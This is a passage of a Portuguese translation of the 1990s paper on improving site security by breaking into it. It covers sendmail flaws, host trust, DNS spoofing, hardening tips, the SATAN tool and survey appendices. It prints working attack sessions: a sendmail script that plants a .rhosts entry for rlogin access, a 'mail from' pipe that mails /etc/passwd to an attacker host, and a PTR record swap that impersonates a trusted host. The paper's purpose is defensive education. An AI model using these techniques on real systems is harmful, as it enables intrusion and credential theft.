+   mau% uuencode decode.pag /etc/aliases.pag | mail decode@victom.com
+   mau% /usr/lib/sendmail -fbin -om -oi bin@vitima.com < /dev/null
+
+
+  Uma várias coisas podem ser descobertas apenas se perguntando ao 
+  sendmail se o endereço é aceito (vrfy), ou em que um endereço se 
+  expande (expn). Quando os serviços finger ou rusers estão desligados,
+  vrfy e expan ainda podem ser usados para identificar contas ou alvos.
+  Vrfy e expn ainda podem ser usados para descobrir se o usuário 
+  "pipeando" email para qualquer programa que possa ser explorado (eg,
+  vacation, ordenadores de email, etc). Pode ser uma boa idéia 
+  desabilitar os comandos vrfy e expn: em muitas versões, veja o 
+  arquivo fonte srvrsmtp.c, e apague ou altere as duas linhas na 
+  estrutura CmdTab onde as strings "vrfy" e "expn" aparecem. Máquinas 
+  sem o código fonte ainda podem desabilitar expn e vrfy editando-se o
+  executável  sendmail com um editor binário e trocando "vrfy" e 
+  "expn" com espaços em branco. Obter uma versão mais recente de 
+  sendmail (ver apêndice D) também é um excelente idéia, já que existem
+  mais bugs e problemas de segurança no sendmail do que em qualquer 
+  outro programa UNIX.
+
+
+  ----
+
+ 
+  Em relação a sendmail-sendoff, existem dois bugs bastante conhecidos
+  que devem ser verificados. O primeiro foi definitivamente corrigido 
+  na versão 5.59 do Berkeley; apesar das mensagens abaixo, para versões
+  do sendmail anteriores a 5.59, "mau.com" vem anexada, apesar das 
+  mensagens de erro, junto do cabeçalho típico das mensagens de email:
+ 
+
+   % cat mau_sendmail
+   telnet vitima.com 25 << EOSM
+   rcpt to: /home/zen/.rhosts
+   mail from: zen
+   data
+   random garbage
+   .
+   rcpt to: /home/zen/.rhosts
+   mail from: zen
+   data
+   mau.com
+   .
+   quit
+   EOSM
+  
+   mau% /bin/sh mau_sendmail
+   Trying 128.128.128.1
+   Connected to vitima.com
+   Escape character is '^]'.
+   Connection closed by foreign host.
+
+   mau% rlogin vitima.com -l zen
+  	 Welcome to vitima.com!
+   vitima %
+
+
+  O segundo furo, corrigido apenas recentemente, permite a qualquer um
+  especificar comandos shell e/ou caminhos para os endereços de envio
+  e/ou destino. Tentativas de se manter os detalhes em segredo foram
+  em vão, e extensas discussões em lista e newsgroups levaram a 
+  descoberta de como explorar algumas versões do bug. Assim como muitos
+  bugs do UNIX, quase quase todos sendmails estavam vuneráveis ao 
+  problemas, já que todos compartilham algum código fonte em comum. 
+  Para poupar espaço, não vamos discutir muito sobre isso, mas um 
+  ataque típico para pegar o arquivo de senhas deve ser assim:
+
+
+   mau% telnet vitima.com 25
+   Trying 128.128.128.1...
+   Connected to vitima.com
+   Escape character is '^]'.
+   220 vitima.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
+   mail from: "|/bin/mail zen@mau.com < /etc/passwd"
+   250 "|/bin/mail zen@mau.com < /etc/passwd"... Sender ok
+   rcpt to: nosuchuser
+   550 nosuchuser... User unknown
+   data
+   354 Enter mail, end with "." on a line by itself
+   .
+   250 Mail accepted
+   quit
+   Connection closed by foreign host.
+   mau%
+
+  
+  Durante a escrita deste, a versão 8.6.10 do sendmail (ver apêndice D
+  para informação de como conseguí-la) é a única variação com todos os
+  recentes bugs de segurança corrigidos.
+
+
+  Confiança
+  ---------
+
+  Para nosso último tópico sobre vulnerabilidade, discutiremos algo 
+  mais teórico, e brevemente discutiremos a noção de confiança. Os 
+  casos e implicações de vulnerabilidades descritas aqui são um pouco 
+  mais sutis e difíceis de entender do que foi coberto anteriormente; 
+  no contexto deste artigo, usaremos a palavra confiança sempre que 
+  houver uma situação onde um servidor (veja que qualquer máquina que 
+  permita acesso remoto pode ser chamado de um servidor) permita que 
+  um recurso local seja usado por um cliente sem senha quando 
+  normalmente é obrigatório o uso de senha. Em outras palavras, 
+  limitaremos a discussão a clientes "disfarçados".
+
+  Existem muitos modos de um servidor "confiar": os arquivos .rhosts e
+  hosts.equiv que permitem o acesso sem verificação de senha; 
+  servidores de janelas que permitem sistemas remotos usar e abusar dos
+  privilégios; exportem arquivos que controlem acesso via NFS entre 
+  outros.
+
+  Quase todos estes usam a conversão de endereços IP para nome para
+  determinar se um serviço deve ou não ser concedido. O método mais
+  simples usa o arquivo /etc/hosts para uma busca direta. Porém, hoje
+  a maioria dos servidores utilizam DNS (Domain Name Service), NIS, ou
+  ambos para o serviço de busca. Uma busca reversa ocorre quando um
+  servidor tem um endereço IP (de um cliente se conectando) e deseja
+  obter o nome do cliente.
+
+  Mesmo que o conceito de como a confiança entre máquinas funciona seja
+  bem entendido pela maioria dos administradores de sistema, os perigos
+  da confiança, e o problema prático que representa, independente do
+  disfarçe do hostname, é um dos problemas menos entendidos que 
+  conhecemos na Internet. Isso vai bem além dos óbvios arquivos 
+  hosts.equiv e rhosts; NFS, NIS, sistemas de janela -- realmente, 
+  muitos destes serviços no UNIX são baseados no conceito de que sites
+  bem conhecidos (para o administrador ou usuário) são confiáveis de 
+  algum modo. O que não é entendido é como redes amarram a segurança 
+  no que normalmente é considerado máquinas disjuntas.
+
+  Qualquer forma de confiança pode ser lograda, enganada e subvertida,
+  especialmente quando a autoridade encarregada de verificar as 
+  credenciais do cliente esteja fora do domínio administrativo do
+  servidor, ou quando o mecanismo de confiança está baseado em algo 
+  que tenha uma forma de autentificação fraca; geralmente ambos.
+
+  Obviamente, se o servidor que contêm o banco de dados (seja NIS, DNS
+  ou qualquer coisa) for comprometido, o invasor pode convencer o 
+  servidor alvo que ele é um servidor confiável; basta saber quais
+  servidores o alvo confia. Esta tarefa geralmente é conseguida se
+  examinando de onde os administradores do sistema e contas do sistema
+  (como root) se logaram. Voltando ao nosso alvo, vitima.com, é 
+  possível observar que o root e outras contas do sistema se logaram de
+  grande.vitima.com. Você pode mudar o registro PTR para mau.com para
+  que quando você tentar dar um rlogin a partir de mau.com para 
+  vitima.com, vitima.com tente procurar seu hostname e encontre o que 
+  você colocou no registro. Se o registro no banco de dados DNS se 
+  parece com:
+
+
+   1.192.192.192.in-addr.arpa     IN      PTR     mau.com
+
+
+  E você altera para:
+
+
+   1.192.192.192.in-addr.arpa     IN      PTR     grande.vitima.com
+
+
+  então, dependendo de quanto o software de vitima.com for nativo, ele
+  acreditará que o login vem de grande.vitima.com e, assumindo que 
+  grande.vitima.com está nos arquivos /etc/hosts.equiv ou /.rhosts,
+  você será capaz de se logar sem fornecer uma senha. Com NIS, é um 
+  simples caso de, ou editar o banco de dados no NIS mestre (se for
+  controlado pelo invasor) ou de enganar ou forçar o NIS (veja a
+  discussão sobre segurança NIS acima) para dar ao alvo a informação
+  que você desejar. Embora mais complexo, interessante e destrutivo,
+  os ataques podem ser feitos via DNS e por questões de tempo e espaço
+  não mostraremos aqui.
+
+  Dois métodos pode ser usados para previnir tais ataques. O primeiro
+  é o mais direto, embora o menos prático. Se seu site não confia em
+  ninguém, você não estará vulnerável ao "host spoofing". A outra 
+  estratégia é usar protocolos criptografados. Usar o protocolo RPC
+  seguro (usado no NFS seguro, NIS+, etc) é um método; embora sua
+  criptografia já tenha sido quebrada, ainda fornece melhores garantias
+  do que esquemas de autentificação RPC que não usam nenhuma forma
+  de encriptação. Outras soluções, seja em hardware (smarcards) e 
+  software (Kerberos), estão sendo desenvolvidas, mas ainda são
+  incompletas ou necessitam de mudanças no software do sistema.
+
+  O apêndice B detalha o resultado de uma pesquisa informal feita em
+  vários servidores na Internet.
+
+
+  Protegendo o sistema
+  --------------------
+
+  Esperamos que tenhamos demonstrado que mesmo alguns dos mais 
+  inocentes serviços podem oferecer (algumas vezes inesperadamente) 
+  munição para os crackers. Mas, é claro, se segurança fosse tudo, 
+  nenhum computador seria ligado ou deixado numa rede com milhões de 
+  invasores potenciais. Ao invés de repetir alguns avisos do que ligar
+  ou desligar, preferimos dar algumas sugestões:
+
+  o  Se você não pode desligar o serviço finger, considere a instalação
+     de um daemon finger modificado. Raramente é necessário revelar o
+     diretório home de um usuário ou seu último login.
+
+  o  Não rode NIS a menos que seja absolutamente necessário. Use NFS 
+     tão pouco for possível.
+
+  o  Nunca exporte filesystems NFS de maneira irrestrita para "o mundo".
+     Tente exportar filesystems apenas para leitura onde possível.
+
+  o  Fortaleça e proteja servidores (e.g. servidores que forneçam um
+     serviço para outros servidores -- NFS, NIS, DNS, o que for). Use
+     apenas contas administrativas nestes servidores.
+
+  o  Examine cuidadosamente os serviços oferecidos por inetd e 
+     portmapper. Elimine todos que não forem absolutamente necessários.
+     Use os wrappers inetd de Wietse Venema. Isso aumenta 
+     significativamente a capacidade de auditoria do UNIX, 
+     especialmente em relação aos ataques de rede. Se possível, use 
+     o mecanismo loghost do syslog para coletar informações
+     relacionadas com segurança em um servidor.
+
+  o  Elimine "confiança" ('trust') a menos que seja absolutamente 
+     necessária. "Confiança" é seu inimigo.
+
+  o  Utilize senhas com 'shadow' e um comando passwd que não permita 
+     senhas fracas. Desabilite ou apague contas inativas.
+
+  o  Mantenha-se informado -- leia (veja nossa lista de leituras 
+     sugeridas e a bibliografia no final deste artigo) e conheça as 
+     ferramentas de segurança; comunique aos outros os problemas de 
+     segurança e outros incidentes. No mínimo, assine a lista de 
+     discussão da CERT e o ezine Phrack (e a lista de firewalls, se 
+     seu site estiver usando ou pensando em instalar um) e leia os 
+     newsgroups sobre segurança para saber das últimas. Ignorância é o
+     mais perigoso problema de segurança que conhecemos.
+
+  o  Instale todos os patches tão logo for possível em todos seu 
+     servidores. Fique atento para novos bugs.
+
+
+  É interessante notar que soluções simples para problemas de segurança
+  como rodar Kerberos, usar senhas utilizáveis apenas uma vez ou 
+  "tokens" digitais são ineficazes contra a maioria dos ataques que 
+  discutimos aqui. Recomendamos de coração o uso destes sistemas, mas 
+  tenha em mente que eles NÃO são uma solução total -- são parte de um
+  esquema maior para defender seu sistema.
+
+
+  Conclusões
+  ----------
+
+  Realmente nenhum dos métodos mostrados aqui são surpreendentes; ao
+  escrever este artigo, não aprendemos muito sobre como invadir 
+  sistemas. O que nós aprendemos foi, ao testar estes métodos em nossos
+  próprios sistemas e dos nossos amigos, quanto estes métodos são 
+  eficazes para se obter acesso num típico servidor (UNIX) Internet. 
+  Cansados de digitar tudo várias vezes e desejando manter nossos 
+  sistemas mais seguros, decidimos implementar uma ferramenta de 
+  segurança (SATAN) que testa em servidores remotos pelo menos alguns 
+  problemas discutidos aqui. O típico retorno, ao dizer as pessoas 
+  sobre nosso artigo e nossa ferramenta foi algo do tipo "isso parece 
+  muito perigoso -- espero que vocês não distribuam isso para todo 
+  mundo. Mas já que você pode confiar em mim, posso ter uma cópia ?"
+
+  Nunca pretendemos criar um livro de receitas ou caixa de ferramentas
+  de métodos e programas para invasão de sistemas -- ao contrário, 
+  vimos que estes mesmos métodos estavam sendo usados, todos os dias 
+  contra nós mesmos e contra outros administradores de sistemas amigos 
+  nossos. Acreditamos que ao propagar a informação que normalmente não
+  estava disponível fora do submundo, aumentaríamos a segurança ao 
+  aumentar o alarmismo. Tentar restrigir o acesso a informações 
+  "perigosas" sobre segurança nunca foi um meio eficaz de se aumentar 
+  a segurança; realmente, o contrário parece acontecer, já que 
+  crackers mostram poucas restrições em compartilhar suas informações 
+  entre si.
+
+  Enquanto é quase certo que algumas informações mostradas aqui é 
+  novidade para (aspirantes a) crackers, e que alguns irão usá-la para
+  ganhar acesso não-autorizado em servidores, a evidência apresentada 
+  aqui por nossos testes "ad hoc" mostram que existem muitos sites
+  inseguros, simplesmente porque os administradores não tem muito 
+  conhecimento sobre o assunto -- não porque são estúpidos ou lerdos,
+  mas simplesmente porque não tem tempo para explorar todos os assuntos
+  pertinentes a segurança. Junte a isso o fato deste tipo de informação
+  não ser de fácil acesso, e você terá sistemas com poucas defesas.
+  Esperamos que este artigo forneça a informação "ruim", mas 
+  necessária, de como os sistemas são invadidos, e mais, que explique 
+  porquê certos passos devem ser dados para tornar seguro um sistema. 
+  Saber porque algo é um problema é, na nosso opinião, a verdadeira 
+  chave para aprender e fazer uma escolha inteligente do que segurança significa
+  para seu site.
+
+
+  ----
+
+
+  Apêndice A
+  ----------
+
+  SATAN (Security Analysis Tool for Auditing Networks)
+
+  Originalmente concebido há alguns anos atrás, SATAN é realmente o
+  protótipo de uma visão maior e muito mais compressiva de uma 
+  ferramenta de segurança. Em sua última incarnação, SATAN testa e 
+  reporta remotamente vários bugs e fraquezas em serviços de rede e 
+  sistemas de janelas, assim como detalhar o máximo possível de 
+  informações úteis sobre o(s) alvo(s). Ele então processa os dados 
+  com um filtro e gera um relatório para análise. Mesmo não sendo 
+  particularmente rápido, é extremamente modular e fácil de modificar.
+
+  SATAN consiste de vários sub-programas, cada um sendo um executável 
+  (perl, shell, C, ou qualquer coisa) e que testa as possíveis 
+  fraquezas de um servidor. Adicionar programas de teste mais tarde é 
+  simples como colocar um executável no diretório principal com a 
+  extensão ".satan"; o programa principal irá automaticamente 
+  executá-lo. O programa principal gera um conjunto de alvos (usando
+  DNS e uma versão mais rápida de ping para encontrar alvos "vivos"), 
+  e então executa cada um dos programas em cada um dos alvos. Um 
+  programa que filtra e interpreta dados analisa a saída, e por fim, 
+  um outro programa gera uma relatório.
+
+  Todo o pacote, incluíndo o código fonte e a documentação, está 
+  disponível gratuitamente para o público, via ftp anônimo e em vários
+  grupos da Usenet.
+
+
+  ----
+
+
+  Apêndice B
+  ----------
+
+  Uma pesquisa informal dirigida em cerca de doze sites Internet 
+  (educacionais, militares e comerciais, com mais de 200 servidores e
+  40000 contas) revelou que, na média, quase 10% das contas tinham
+  arquivos .rhosts. Estes arquivos tinham em média seis servidores;
+  entretanto, não foi díficil ter cerca de cem entradas num arquivo 
+  .rhosts, e em algumas ocasiões, o número foi chegou a quinhentas!
+  (Este não é um recorde de se orgulhar). Além disso, cada site 
+  diretamente ligado a Internet confiava num usuário ou servidor em 
+  outro site -- assim, a segurança do site não estava sob o controle 
+  direto dos administradores do sistema. Os sites maiores, com mais 
+  usuários e servidores, tinha uma porcentagem menor de usuários com 
+  arquivos .rhosts, mas o tamanho dos arquivos aumentava, assim como o
+  número de servidores "confiáveis".
+
+  Mesmo que seja muito difícil verificar quantas das entrada eram 
+  válidas, com hostnames como "Makefile", "Message-Id:" e 
+  "^Cs^A^C^M^Ci^C^MpNu^L^Z^O", assim como várias entradas "curingas",
+  nos questionamos a razão de se colocar a segurança de um site nas
+  mãos de seus usuários. Muitos usuários (especialmente aqueles com
+  arquivos .rhosts maiores) tentaram colocar comentários como os do 
+  shell em seus arquivos .rhosts, que a maioria dos sistemas UNIX
+  tenta converter como nomes de servidores válidos.
+
+  Infelizmente, um invasor pode usar técnicas de spoofing de DNS e
+  NIS discutidas anteriormente, para mudar seu hostname para "#" e
+  se logar livremente. Isso coloca muitos sites em risco (ao menos
+  uma empresa distribui seus sistemas com comentários nos seus
+  arquivos /etc/hosts.equiv files.)
+
+  Você pode achar que estes sites não são atípicos mas, na verdade, não
+  são. Virtualmente todos administradores conhecem bastante sobre 
+  segurança e escrevem programas de segurança como hobby ou 
+  profissionalmente. Apenas podemos supor como um site "típico" deve
+  parecer.
+
+
+  ----
+
+
+  Apêndice C
+  ----------
+
+  Após receber um email de um site que foi invadido a partir de uma de
+  nossas máquinas, começamos uma investigação. Descobrimos que o 
+  invasor estava trabalhando com uma lista de sites ".com" 
+  (comerciais), procurando servidores com arquivos de senhas fáceis de
+  roubar. Neste caso, "fácil de roubar" se refere a sites com nomes de
+  domínio NIS previsíveis e servidor NIS acessível. Mesmo sem saber até 
+  onde o invasor chegou, pareceu ser uma boa idéia alertar os sites que 
+  estavam suscetíveis ao roubo do arquivo de senhas. Dos 656 servidores
+  na lista do invasor, 24 tinham arquivos fáceis de roubar -- quase 1 
+  em 25 servidores ! Um terço destes arquivos possuiam pelo menos uma 
+  conta sem senha e com shell. Num total de 1594 contas, a execução de 
+  um password cracker gratuito (Crack) durante dez minutos, foram 
+  reveladas 50 senhas, usando apenas uma estação Sun barata. Outras 40
+  senhas foram encontradas nos próximos 20 minutos; e uma senha para o
+  root foi encontrada em pouco mais de uma hora. O resultado após 
+  poucos dias de cracking: cinco senhas root, 19 de 24 arquivos de 
+  senhas (8%) com ao menos uma senha descoberta, e 259 de 1594 (uma em
+  seis) senhas quebradas.
+
+  ----
+
+  Apêndice D
+  ----------
+
+  Como encontrar alguns recursos gratuitos sobre segurança na Internet
+
+  Listas:
+
+  o  Lista CERT (Computer Emergency Response Team).
+     Envie um email para cert@cert.org, solicitando 
+     sua inclusão na lista.
+
+  o  Ezine "Phrack". Envie um email para 
+     phrack@well.sf.ca.us, solicitando sua
+     inclusão na lista.
+
+  o  Lista "Firewalls". Envie a seguinte linha para
+     majordomo@greatcircle.com:
+
+     subscribe firewalls
+
+  o  Computer Underground Digest. Envie um email para
+     tk0jut2@mvs.cso.niu.edu, solicitando sua inclusão
+     na lista.
+
+
+  Software gratuito
+  -----------------
+
+  COPS (Computer Oracle and Password System) está disponível via 
+  ftp anônimo em archive.cis.ohio-state.edu, pub/cops/1.04+.
+
+  "TCP wrappers" está disponível via ftp anônimo em ftp.win.tue.nl,
+  pub/security.
+
+  Crack está disponível em ftp.uu.net, /usenet/comp.sources.misc/volume28.
+
+  TAMU é uma ferramenta de auditoria UNIX que faz parte de um pacote
+  maior de excelentes ferramentas lançado por um grupo da Universidade
+  A&M do Texas. Pode ser pego via ftp anônimo em net.tamu.edu, 
+  pub/security/TAMU.
+
+  Fontes para ftpd e muitos outros utilitários de rede podem ser 
+  encontrados em ftp.uu.net, packages/bsd-sources.
+
+  Fontes para ISS (Internet Security Scanner), uma ferramente que
+  verifica remotamente várias vulnerabilidades de rede está disponível 
+  via ftp anônimo em ftp.uu.net, usenet/comp.sources.misc/volume40/iss.
+
+  Securelib está disponível via ftp anônimo em ftp.uu.net, 
+  usenet/comp.sources.misc/volume36/securelib.
+
+  A última versão do sendmail da Berkeley está disponível via 
+  ftp anônimo em ftp.cs.berkeley.edu, ucb/sendmail.
+
+  Tripwire, um verificador de integridade do filesystem, está 
+  disponível via ftp anônimo em ftp.cs.purdue.edu, pub/spaf/COAST/Tripwire.
+
+  ----
+
+  Bibliografia
+  ------------
+
+  Baldwin, Robert W., Rule Based Analysis of Computer Security,
+  Massachusetts Institute of Technology, June 1987.
+
+  Bellovin, Steve, Using the Domain Name System for System Break-ins,
+  1992 (não publicado).
+
+  Massachusetts Institute of Technology, X Window System Protocol,
+  Version 11, 1990.
+
+  Shimomura, Tsutomu, private communication.
+
+  Sun Microsystems, OpenWindows V3.0.1 User Commands, March 1992.
+
+  ----
+
+  Leitura recomendada
+  -------------------
+
+  Bellovin, Steve -- "Security Problms in the TCP/IP Protocol Suite", 
+  Computer Communication Review 19 (2), 1989; a comment by Stephen
+  Kent appears in volume 19 (3), 1989.
+
+  Garfinkel, Simson and Spafford, Gene, "Practical UNIX Security",
+  O'Reilly and Associates, Inc., 1992.
+
+  Hess, David, Safford, David, and Pooch, Udo, "A UNIX Network Protocol
+  Study: Network Information Service", Computer Communication Review
+  22 (5) 1992.
+
+  Phreak Accident, Playing Hide and Seek, UNIX style, Phrack, Volume
+  Four, Issue Forty-Three, File 14 of 27.
+
+  Ranum, Marcus, "Firewalls" internet electronic mailing list, Sept
+  1993.
+
+  Schuba, Christoph, "Addressing Weaknesses in the Domain Name System
+  Protocal", Purdue University, August 1993.
+
+  Thompson, Ken, Reflections on Trusting Trust, Communications of the ACM
+  27 (8), 1984.
+
+  --------------------------------------------------------------------
+  Virtualis nº9 -- Aumente a segurança de seu site invadindo-o
